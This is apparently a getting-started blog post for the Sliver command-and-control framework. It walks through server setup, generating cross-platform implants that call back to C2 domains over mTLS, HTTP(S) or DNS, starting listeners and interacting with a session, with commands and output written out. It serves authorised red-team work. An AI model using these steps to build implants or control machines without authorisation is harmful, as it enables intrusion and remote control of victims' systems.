---
layout: post
title:  "Getting Started"
author: "moloch"
date:   2021-07-07 09:01:33 -0500
categories: sliver
---

# 1. Server Setup

The first thing you'll need to do is setup a Sliver server.

The server supports Linux, Windows, and MacOS however we recommend running the server on a Linux or MacOS host, as some features may be more difficult to get working on a Windows server. However, the Windows client should work just fine when accessing a Linux/MacOS server.

Download the latest [release](https://github.com/BishopFox/sliver/releases) for your platform, and just run the binary. The first time you run the server it'll need to unpack some assets, which may take a minute or two, subsequent start ups should be faster.

__NOTE:__ Sliver has two external dependencies for _optional_ features: MinGW and Metasploit. To enable shellcode/staged payloads you need to install MinGW. To enable MSF integrations you'll need Metasploit installed.

The `Dockerfile` build of Sliver is mostly designed to run the unit tests but includes both MinGW and Metasploit. If you plan to run the server using Docker you'll need to forward the appropriate TCP ports (e.g. 80, 443, 31337) yourself.


### MinGW Setup (Optional)

In order to enable shellcode/staged/DLL payloads you'll need to install MinGW on the server (clients connecting to the server do not need it installed). By default Sliver will look in the usual places for MinGW binaries but you can override this using the [environment variables](https://github.com/BishopFox/sliver/wiki/Environment-Variables).

#### Linux

```
apt-get install mingw-w64 binutils-mingw-w64 g++-mingw-w64
```

#### MacOS

```
brew install mingw-w64
```

__Note:__ On MacOS you'll likely have to configure [environment variables](https://github.com/BishopFox/sliver/wiki/Environment-Variables) for MinGW.

### Metasploit Setup (Optional)

We strongly recommend using the [nightly framework installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers), Sliver expects version 5 or later.

## Generating Implants

Generating implants is done using the `generate` command, you must specify at least one C2 endpoint using `--mtls`, `--wg`, `--http`, or `--dns`. Note that when an implant attempts to connect to an endpoint specified using `--http` it will try both HTTPS and then HTTP (if HTTPS fails). We recommend using mTLS (`--mtls`) or WireGuard (`--wg`) whenever possible. You can also specify an output directory with `--save`, by default the implant will be saved to the current working directory.

```
sliver > generate --mtls example.com --save /Users/moloch/Desktop

[*] Generating new windows/amd64 Sliver binary
[*] Build completed in 00:10:16
[*] Sliver binary saved to: /Users/moloch/Desktop/NEW_GRAPE.exe
```

Sliver implants are cross-platform, you can change the compiler target with the `--os` flag. Sliver accepts any Golang GOOS and GOARCH as arguments `--os` and `--arch`, we officially only support Windows, MacOS, and Linux, but you can at least attempt to compile for any other [valid Golang GOOS/GOARCH](https://gist.github.com/asukakenji/f15ba7e588ac42795f421b48b8aede63) combination. WARNING: Some commands/features may not work on "unsupported" platforms.

```
sliver > generate --mtls example.com --save /Users/moloch/Desktop --skip-symbols --os mac

[*] Generating new darwin/amd64 Sliver binary
[!] Symbol obfuscation is disabled
[*] Build completed in 00:00:03
[*] Sliver binary saved to: /Users/moloch/Desktop/PROPER_ANTHONY
```

The server will also assign codenames to each generated binary i.e. `NEW_GRAPE.exe` you can rename the file to anything you need to, but these codenames will still uniquely identify the generated binary (they're inserted at compile-time). You can also view all previously generated implant binaries with the `slivers` command:

```
sliver > slivers

Name                    OS/Arch        Debug  Format
====                    =======        =====  ======
CAUTIOUS_PANPIPE        darwin/amd64   false  EXECUTABLE
LATE_SUBCOMPONENT       windows/amd64  false  SHARED_LIB
RUBBER_PRINTER          windows/amd64  true   SHARED_LIB
RACIAL_SPECTACLES       darwin/amd64   false  EXECUTABLE
MATHEMATICAL_SASH       darwin/amd64   true   SHARED_LIB
MUSHY_TRADITIONALISM    windows/amd64  false  SHARED_LIB
SICK_SPY                darwin/amd64   false  EXECUTABLE
```

If you need to re-download a previously generated implant use the `regenerate` command, note that positional arguments (the implant name) comes after the command flags (e.g., `--save`):

```
sliver > regenerate --save /Users/moloch/Desktop/ NEW_GRAPE

[*] Sliver binary saved to: /Users/moloch/Desktop/NEW_GRAPE.exe
```

#### Additional Details

For addition details about each C2 please see:
* [HTTP(S) C2](https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2)
* [DNS C2](https://github.com/BishopFox/sliver/wiki/DNS-C2)

## Getting Shells

Before you can catch the shell, you'll first need to start a listener. You use the commands `mtls`, `http`, `https`, and `dns` to start listeners for each protocol (remember endpoints specified with `--http` can connect to a listener started with `https`). You can use the `jobs` command to view and manage listeners running in the background.

```
sliver > mtls

[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver > jobs

ID  Name  Protocol  Port
==  ====  ========  ====
1   mTLS  tcp       8888
```

In this example we're using Mutual TLS, the required certificates for setting up and securing this connection have already been generated in the background and the client certificate pair was embedded into the implant at compile-time. So to get a shell you just have to run the binary on the target.

```
[*] Session #1 PROPER_ANTHONY - 127.0.0.1:49929 (narvi.local) - darwin/amd64

sliver > use 1

[*] Active sliver PROPER_ANTHONY (1)

sliver (PROPER_ANTHONY) > ls

/Users/moloch/Desktop
=====================
.DS_Store                 6.0 KiB
.localized                0 B
PROPER_ANTHONY            6.3 MiB
```


## Multiple Domains/Protocols

You can specify multiple domains and protocols during the generation process. Right now Sliver will attempt to use the most performant protocols first (MTLS -> HTTP(S) -> DNS) using subsequent domains/protocols when connections fail.

```
sliver > generate --mtls example.com --http foobar.com --dns 1.lil-peep.rip
```

Eventually we'll add a feature to manually specify the fallback protocols, or you can add this feature and send up a PR :).


